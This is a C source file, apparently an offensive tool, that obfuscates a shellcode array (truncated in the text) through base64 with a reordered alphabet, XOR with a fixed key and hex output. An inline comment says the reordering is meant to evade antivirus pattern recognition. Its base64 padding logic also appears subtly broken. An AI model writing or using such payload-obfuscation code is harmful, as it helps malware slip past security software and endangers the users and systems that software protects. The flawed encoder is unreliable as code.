#include <Windows.h>
#include <stdio.h>
#include <string.h>

void xor_encrypt(unsigned char* data, int length, unsigned char key) {
    for (int i = 0; i < length; i++) {
        data[i] ^= key;
    }
}

const char* base64_chars = "ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0987654321+/"; 
// use different orders for b64 chars to avoid pattern recognition mechanisms used by anti viruses
void base64_encode(unsigned char* data, int length, char* output) {
    int i = 0, j = 0, enc_len = 0;
    unsigned char char_array_3[3], char_array_4[4];
    while (length--) {
        char_array_3[i++] = *(data++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            for (i = 0; i < 4; i++) {
                output[enc_len++] = base64_chars[char_array_4[i]];
            }
            i = 0;
        }
    }

    if (i) {
        for (int j = i; j < 3; j++) {
            char_array_3[j] = '\0';
        }
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        for (i = 0; i < 3; i++) {
            output[enc_len++] = base64_chars[char_array_4[i]];
        }
        while ((i++ < 3)) {
            output[enc_len++] = '=';
        }
    }
    output[enc_len] = '\0'; // to terminate the string
}

void hex_encode(unsigned char* data, int length, char* output) {
    for (int i = 0; i < length; i++) {
        sprintf(output + (i * 2), "%02x", data[i]);
    }
    output[length * 2] = '\0';
}

int main() {
    unsigned char shellcode[] = {
    0xd9, 0xeb, 0x9b, 0xd9, 0x74, 0x24, 0x08, .......
    }; 
    int shellcode_length = sizeof(shellcode);
    char base64_encoded[512];
    base64_encode(shellcode, shellcode_length, base64_encoded);
    printf("Base64 Encoded Shellcode: %s\n", base64_encoded);
    xor_encrypt((unsigned char*)base64_encoded, strlen(base64_encoded), 0xAA); // Use any XOR key
    printf("XOR Encrypted Base64 (Hex):\n");
    char hex_output[1024];
    hex_encode((unsigned char*)base64_encoded, strlen(base64_encoded), hex_output);
    printf("%s\n", hex_output);

    return 0;
}
